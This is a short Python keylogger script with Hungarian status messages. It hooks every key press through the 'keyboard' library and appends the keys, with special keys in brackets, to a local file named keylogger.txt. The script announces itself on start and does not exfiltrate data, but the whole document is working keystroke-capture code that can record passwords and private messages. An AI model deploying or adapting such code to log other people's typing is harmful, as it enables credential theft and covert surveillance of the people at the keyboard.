import keyboard 
import time

localtime = time.asctime( time.localtime(time.time()) )
print("A program fut: ", localtime, "óta.")
print("A program sikeresen menti a lenyomott gombokat.")
print("A .txt file ugyanott található, mint a program.")

def writer(data):
    with open("keylogger.txt","a") as file:
        file.write(data)

def filter(char):
    if char == "space":
        return " "
    elif len(char) > 1:
        return "[%s]" % char
    else:
        return char

def logger(event):
    writer(filter(event.name))

keyboard.on_press(logger)
keyboard.wait()
